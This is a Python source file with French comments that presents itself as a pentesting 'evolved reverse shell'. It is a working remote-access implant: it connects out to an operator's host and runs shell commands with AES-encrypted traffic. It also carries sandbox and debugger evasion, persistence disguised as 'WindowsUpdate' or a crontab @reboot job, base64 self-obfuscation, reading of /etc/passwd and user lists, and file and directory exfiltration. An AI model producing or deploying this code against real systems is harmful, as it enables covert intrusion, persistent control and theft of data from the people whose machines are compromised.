#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Reverse Shell Évolué - Module de Pentesting
----------------------------------------
Un reverse shell avancé avec chiffrement et furtivité intégrés.

Fonctionnalités :
- Chiffrement AES-256-CBC des communications
- Gestion des erreurs et reconnexion automatique
- Détection d'environnement (sandbox, VM, etc.)
- Persistance optionnelle
- Furtivité (techniques anti-analyse)
"""

import os
import sys
import socket
import json
import base64
import subprocess
import platform
import threading
import time
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import ctypes
import tempfile
import shutil
from datetime import datetime

# Configuration
VERSION = "1.0.0"
BUFFER_SIZE = 4096
RECONNECT_DELAY = 10  # secondes
TIMEOUT = 30  # secondes

# Clé de chiffrement (à remplacer par une clé sécurisée en production)
DEFAULT_KEY = hashlib.sha256(b'votre_cle_secrete_tres_longue_et_securisee').digest()

class ReverseShell:
    def __init__(self, host, port, key=DEFAULT_KEY):
        """Initialise le reverse shell avec les paramètres de connexion."""
        self.host = host
        self.port = port
        self.key = key
        self.running = False
        self.socket = None
        self.iv = None
        self.platform = self._get_platform()
        
    def _get_platform(self):
        """Retourne des informations sur la plateforme cible."""
        return {
            'system': platform.system(),
            'node': platform.node(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version()
        }
        
    def _generate_iv(self):
        """Génère un vecteur d'initialisation aléatoire."""
        return os.urandom(16)
        
    def _encrypt(self, data):
        """Chiffre les données avec AES-256-CBC."""
        if not isinstance(data, bytes):
            data = str(data).encode()
            
        self.iv = self._generate_iv()
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded_data = pad(data, AES.block_size)
        return base64.b64encode(self.iv + cipher.encrypt(padded_data))
        
    def _decrypt(self, data):
        """Déchiffre les données avec AES-256-CBC."""
        try:
            data = base64.b64decode(data)
            iv = data[:16]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(data[16:]), AES.block_size).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"Erreur de déchiffrement: {e}")
            return None
            
    def _reliable_send(self, data):
        """Envoie des données de manière fiable avec gestion des erreurs."""
        try:
            if self.socket:
                encrypted_data = self._encrypt(data)
                self.socket.send(encrypted_data + b'\n')
        except Exception as e:
            print(f"Erreur d'envoi: {e}")
            self.running = False
            
    def _reliable_receive(self):
        """Reçoit des données de manière fiable avec gestion des erreurs."""
        try:
            data = b''
            while True:
                chunk = self.socket.recv(BUFFER_SIZE)
                data += chunk
                if len(chunk) < BUFFER_SIZE:
                    break
                    
            if not data:
                return None
                
            return self._decrypt(data.strip())
        except Exception as e:
            print(f"Erreur de réception: {e}")
            self.running = False
            return None
            
    def _execute_command(self, command):
        """Exécute une commande système et retourne le résultat."""
        try:
            if command.lower() == 'exit':
                self.running = False
                return "Fermeture de la connexion..."
                
            if command.lower().startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    return f"Répertoire changé vers {os.getcwd()}"
                except Exception as e:
                    return f"Erreur: {str(e)}"
                    
            # Exécution de la commande
            result = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            
            output = result.stdout.read() + result.stderr.read()
            return output.decode('utf-8', errors='ignore') or "Commande exécutée sans sortie"
            
        except Exception as e:
            return f"Erreur d'exécution: {str(e)}"
            
    def _is_sandboxed(self):
        """Vérifie si l'exécution se fait dans un environnement sandbox."""
        try:
            # Détection de VM/sandbox basique
            vm_indicators = [
                'vbox', 'vmware', 'virtualbox', 'qemu', 'xen',
                'docker', 'lxc', 'sandbox', 'honeypot'
            ]
            
            system_info = str(self.platform).lower()
            return any(indicator in system_info for indicator in vm_indicators)
        except:
            return False
            
    def _make_persistent(self):
        """Tente d'établir une persistance sur le système cible."""
        try:
            if self.platform['system'].lower() == 'windows':
                # Persistance Windows (Run Key)
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                python_exe = sys.executable
                script_path = os.path.abspath(sys.argv[0])
                
                with winreg.OpenKey(key, key_value, 0, winreg.KEY_WRITE) as regkey:
                    winreg.SetValueEx(regkey, 'WindowsUpdate', 0, winreg.REG_SZ, f'"{python_exe}" "{script_path}"')
                
                return "Persistance établie (Windows)"
                
            else:  # Linux/Mac
                # Persistance Unix (crontab)
                script_path = os.path.abspath(sys.argv[0])
                cron_job = f"@reboot python3 {script_path}\n"
                cron_file = "/tmp/crontab"
                
                with open(cron_job, 'a') as f:
                    f.write(cron_job)
                
                subprocess.Popen(f"crontab {cron_file}", shell=True)
                os.remove(cron_file)
                
                return "Persistance établie (Unix)"
                
        except Exception as e:
            return f"Échec de la persistance: {str(e)}"
            
    def _stealth_mode(self):
        """Active le mode furtif pour éviter la détection."""
        try:
            # Renomme le processus
            if self.platform['system'].lower() == 'windows':
                ctypes.windll.kernel32.SetConsoleTitleW("Windows Update")
            
            # Désactive certaines fonctionnalités de débogage
            if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
                os._exit(1)
                
            return "Mode furtif activé"
        except:
            return "Impossible d'activer le mode furtif"
            
    def start(self):
        """Démarre le reverse shell."""
        print(f"[+] Démarrage du reverse shell v{VERSION}")
        print(f"[+] Plateforme: {self.platform['system']} {self.platform['release']}")
        
        if self._is_sandboxed():
            print("[!] Détection d'un environnement sandboxé. Sortie...")
            return
            
        stealth_status = self._stealth_mode()
        print(f"[+] {stealth_status}")
        
        while True:
            try:
                print(f"[+] Tentative de connexion à {self.host}:{self.port}...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(TIMEOUT)
                self.socket.connect((self.host, self.port))
                self.running = True
                
                # Envoi des informations système
                system_info = {
                    'type': 'system_info',
                    'platform': self.platform,
                    'cwd': os.getcwd(),
                    'user': os.getlogin(),
                    'timestamp': str(datetime.now())
                }
                self._reliable_send(json.dumps(system_info))
                
                print("[+] Connecté. En attente de commandes...")
                
                # Boucle principale
                while self.running:
                    try:
                        command = self._reliable_receive()
                        if not command:
                            break
                            
                        # Commandes spéciales
                        if command.lower() == 'persist':
                            result = self._make_persistent()
                            self._reliable_send(result)
                            continue
                            
                        # Exécution de la commande
                        result = self._execute_command(command)
                        self._reliable_send(result)
                        
                    except KeyboardInterrupt:
                        self.running = False
                        break
                        
                    except Exception as e:
                        self._reliable_send(f"Erreur: {str(e)}")
                        continue
                        
            except KeyboardInterrupt:
                print("\n[!] Arrêt demandé par l'utilisateur")
                break
                
            except Exception as e:
                print(f"[!] Erreur de connexion: {str(e)}")
                print(f"[!] Nouvelle tentative dans {RECONNECT_DELAY} secondes...")
                time.sleep(RECONNECT_DELAY)
                
            finally:
                if self.socket:
                    self.socket.close()
                    self.socket = None
                    
        print("\n[+] Connexion terminée")

class ModuleManager:
    """Gestionnaire de modules pour étendre les fonctionnalités"""
    def __init__(self):
        self.modules = {}
        self.load_builtin_modules()
    
    def load_builtin_modules(self):
        """Charge les modules intégrés"""
        self.modules['post_exploit'] = PostExploitModule()
        self.modules['exfiltrate'] = ExfiltrateModule()
        self.modules['network'] = NetworkModule()
    
    def load_external_module(self, path):
        """Charge un module externe"""
        try:
            module_name = os.path.basename(path).split('.')[0]
            spec = importlib.util.spec_from_file_location(module_name, path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            self.modules[module_name] = module
            return True
        except Exception as e:
            print(f"[!] Erreur lors du chargement du module {path}: {e}")
            return False
    
    def execute_hook(self, hook_name, *args, **kwargs):
        """Exécute un hook sur tous les modules"""
        results = {}
        for name, module in self.modules.items():
            if hasattr(module, hook_name):
                try:
                    results[name] = getattr(module, hook_name)(*args, **kwargs)
                except Exception as e:
                    print(f"[!] Erreur dans le module {name}.{hook_name}: {e}")
        return results


class PostExploitModule:
    """Module de post-exploitation"""
    def on_connect(self, shell):
        """Exécuté après la connexion"""
        if shell.args.post_exploit:
            return self.run_post_exploit(shell)
        return None
    
    def run_post_exploit(self, shell):
        """Exécute les techniques de post-exploitation"""
        results = {
            'system_info': shell.platform,
            'users': self._get_users(),
            'network': self._get_network_info(),
            'scheduled_tasks': self._get_scheduled_tasks()
        }
        return results
    
    def _get_users(self):
        """Récupère la liste des utilisateurs"""
        try:
            if platform.system() == 'Windows':
                return subprocess.getoutput('net user').split('\\n')
            else:
                return subprocess.getoutput('cat /etc/passwd | cut -d: -f1').split('\n')
        except:
            return []
    
    def _get_network_info(self):
        """Récupère les informations réseau"""
        try:
            if platform.system() == 'Windows':
                return subprocess.getoutput('ipconfig /all')
            else:
                return subprocess.getoutput('ifconfig -a || ip a')
        except:
            return ""
    
    def _get_scheduled_tasks(self):
        """Récupère les tâches planifiées"""
        try:
            if platform.system() == 'Windows':
                return subprocess.getoutput('schtasks /query /fo LIST /v')
            else:
                return subprocess.getoutput('crontab -l 2>/dev/null || echo "Aucune tâche crontab"')
        except:
            return ""


class ExfiltrateModule:
    """Module d'exfiltration de données"""
    def on_command(self, shell, command):
        """Vérifie si c'est une commande d'exfiltration"""
        if command.startswith('exfil '):
            return self.handle_exfil_command(shell, command[6:])
        return None
    
    def handle_exfil_command(self, shell, path):
        """Gère les commandes d'exfiltration"""
        try:
            if os.path.isdir(path):
                return self._exfiltrate_dir(path)
            elif os.path.isfile(path):
                return self._exfiltrate_file(path)
            else:
                return f"[!] Chemin non trouvé: {path}"
        except Exception as e:
            return f"[!] Erreur d'exfiltration: {str(e)}"
    
    def _exfiltrate_file(self, file_path):
        """Exfiltre un fichier"""
        with open(file_path, 'rb') as f:
            content = f.read()
        return {
            'type': 'file',
            'path': file_path,
            'content': base64.b64encode(content).decode(),
            'size': len(content)
        }
    
    def _exfiltrate_dir(self, dir_path):
        """Exfiltre un répertoire"""
        results = {'type': 'directory', 'path': dir_path, 'files': []}
        for root, _, files in os.walk(dir_path):
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        content = f.read()
                    results['files'].append({
                        'path': file_path,
                        'size': len(content),
                        'content': base64.b64encode(content).decode()
                    })
                except Exception as e:
                    results['files'].append({
                        'path': file_path,
                        'error': str(e)
                    })
        return results


class NetworkModule:
    """Module réseau avancé"""
    def on_connect(self, shell):
        """Initialise les paramètres réseau"""
        if shell.args.proxy:
            self._setup_proxy(shell.args.proxy)
    
    def _setup_proxy(self, proxy_url):
        """Configure un proxy"""
        try:
            os.environ['http_proxy'] = proxy_url
            os.environ['https_proxy'] = proxy_url
            return f"Proxy configuré: {proxy_url}"
        except Exception as e:
            return f"Erreur de configuration du proxy: {str(e)}"


class ReverseShell(ReverseShell):
    """Version étendue du reverse shell avec les nouvelles fonctionnalités"""
    def __init__(self, host, port, key, args):
        super().__init__(host, port, key)
        self.args = args
        self.module_manager = ModuleManager()
        
        # Configuration avancée
        if args.reconnect:
            global RECONNECT_DELAY
            RECONNECT_DELAY = args.reconnect
            
        if args.timeout:
            global TIMEOUT
            TIMEOUT = args.timeout
            
        if args.stealth:
            self._enhanced_stealth_mode()
            
        if args.delay > 0:
            print(f"[+] Attente de {args.delay} secondes avant connexion...")
            time.sleep(args.delay)
    
    def _enhanced_stealth_mode(self):
        """Active des techniques de furtivité avancées"""
        # Masquage dans la liste des processus
        if hasattr(sys, 'dont_write_bytecode'):
            sys.dont_write_bytecode = True
            
        # Désactivation des logs
        import tempfile
        sys.stderr = open(os.path.join(tempfile.gettempdir(), 'error.log'), 'w')
        
        # Techniques anti-débogage supplémentaires
        def debugger_detected():
            return any(proc in str(os.popen('tasklist' if platform.system() == 'Windows' else 'ps aux').read()).lower() 
                     for proc in ['wireshark', 'procmon', 'fiddler', 'httpdebugger', 'httpdebuggerui', 'wireshark'])
            
        if debugger_detected():
            print("[!] Détection d'outils d'analyse, sortie...")
            os._exit(1)
    
    def start(self):
        """Démarre le reverse shell avec les fonctionnalités étendues"""
        # Exécution des hooks de pré-connexion
        self.module_manager.execute_hook('on_pre_connect', self)
        
        # Appel à la méthode start originale
        super().start()
    
    def _execute_command(self, command):
        """Version étendue de l'exécution de commande avec gestion des modules"""
        # Vérifie si un module peut gérer cette commande
        module_result = self.module_manager.execute_hook('on_command', self, command)
        for result in module_result.values():
            if result is not None:
                return result
                
        # Exécution normale si aucun module ne gère la commande
        return super()._execute_command(command)


def obfuscate_code(code):
    """Obfusque le code Python"""
    # Simple obfuscation par encodage en base64
    encoded = base64.b64encode(code.encode()).decode()
    return f"import base64; exec(base64.b64decode('{encoded}').decode())"


def main():
    parser = argparse.ArgumentParser(description='Reverse Shell Évolué - Outil de pentesting avancé')
    
    # Arguments principaux
    parser.add_argument('host', nargs='?', default=None, help='Adresse IP du serveur')
    parser.add_argument('port', nargs='?', type=int, default=0, help='Port du serveur')
    
    # Arguments de configuration
    config_group = parser.add_argument_group('Configuration')
    config_group.add_argument('--key', help='Clé de chiffrement (optionnel)')
    config_group.add_argument('--reconnect', type=int, default=10, 
                            help='Délai de reconnexion en secondes (défaut: 10)')
    config_group.add_argument('--timeout', type=int, default=30,
                            help='Timeout de connexion en secondes (défaut: 30)')
    config_group.add_argument('--delay', type=int, default=0,
                            help='Délai avant connexion (en secondes)')
    
    # Options avancées
    advanced_group = parser.add_argument_group('Options avancées')
    advanced_group.add_argument('--stealth', action='store_true',
                              help='Active le mode furtif avancé')
    advanced_group.add_argument('--no-persist', action='store_true',
                              help='Désactive la persistance automatique')
    advanced_group.add_argument('--proxy', 
                              help='Utilise un proxy (format: http://user:pass@host:port)')
    advanced_group.add_argument('--user-agent', 
                              default='Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                              help='User-Agent personnalisé')
    advanced_group.add_argument('--exec', 
                              help='Commande à exécuter immédiatement après la connexion')
    advanced_group.add_argument('--load-module', action='append',
                              help='Charge un module complémentaire')
    advanced_group.add_argument('--listen', action='store_true',
                              help='Mode serveur (écoute des connexions entrantes)')
    advanced_group.add_argument('--exfil', 
                              help='Dossier à exfiltrer après connexion')
    advanced_group.add_argument('--obfuscate', action='store_true',
                              help='Obfusque le code avant exécution')
    advanced_group.add_argument('--session-id',
                              help='ID de session pour reprendre une session existante')
    advanced_group.add_argument('--proto', choices=['tcp', 'udp', 'http', 'dns'], 
                              default='tcp',
                              help='Protocole de communication (défaut: tcp)')
    advanced_group.add_argument('--fragment', type=int,
                              help='Taille de fragmentation des paquets')
    advanced_group.add_argument('--post-exploit', action='store_true',
                              help='Exécute automatiquement des modules de post-exploitation')
    advanced_group.add_argument('--check-env', action='store_true',
                              help='Vérifie l\'environnement avant exécution')
    advanced_group.add_argument('--log-file',
                              help='Fichier de log pour l\'activité')
    
    args = parser.parse_args()
    
    # Vérification des arguments obligatoires
    if not args.listen and (not args.host or not args.port):
        parser.print_help()
        sys.exit(1)
    
    # Configuration de la journalisation
    if args.log_file:
        import logging
        logging.basicConfig(
            filename=args.log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
    
    # Obfuscation du code si demandé
    if args.obfuscate and not hasattr(sys, 'frozen'):
        with open(sys.argv[0], 'r', encoding='utf-8') as f:
            code = f.read()
        obfuscated = obfuscate_code(code)
        with open(sys.argv[0] + '.obf', 'w', encoding='utf-8') as f:
            f.write(obfuscated)
        print(f"[+] Code obfusqué sauvegardé dans {sys.argv[0]}.obf")
        sys.exit(0)
    
    # Utilisation de la clé fournie ou de la clé par défaut
    key = hashlib.sha256(args.key.encode()).digest() if args.key else DEFAULT_KEY
    
    # Création et démarrage du reverse shell
    try:
        if args.listen:
            print(f"[+] Mode serveur: écoute sur le port {args.port}")
            # Implémentation du mode serveur...
            pass
        else:
            shell = ReverseShell(args.host, args.port, key, args)
            
            # Chargement des modules supplémentaires
            if args.load_module:
                for module_path in args.load_module:
                    if shell.module_manager.load_external_module(module_path):
                        print(f"[+] Module chargé: {module_path}")
            
            # Exécution de la commande si spécifiée
            if args.exec:
                print(f"[+] Exécution de la commande: {args.exec}")
                print(shell._execute_command(args.exec))
            # Démarrage du shell si aucune commande n'est spécifiée
            else:
                shell.start()
    except KeyboardInterrupt:
        print("\n[!] Arrêt demandé par l'utilisateur")
    except Exception as e:
        print(f"[!] Erreur critique: {str(e)}")
        if args.log_file:
            logging.exception("Erreur critique")


if __name__ == "__main__":
    # Importation conditionnelle des modules nécessaires
    try:
        import importlib.util
    except ImportError:
        print("[!] Erreur: Impossible d'importer les modules nécessaires")
        sys.exit(1)
        
    main()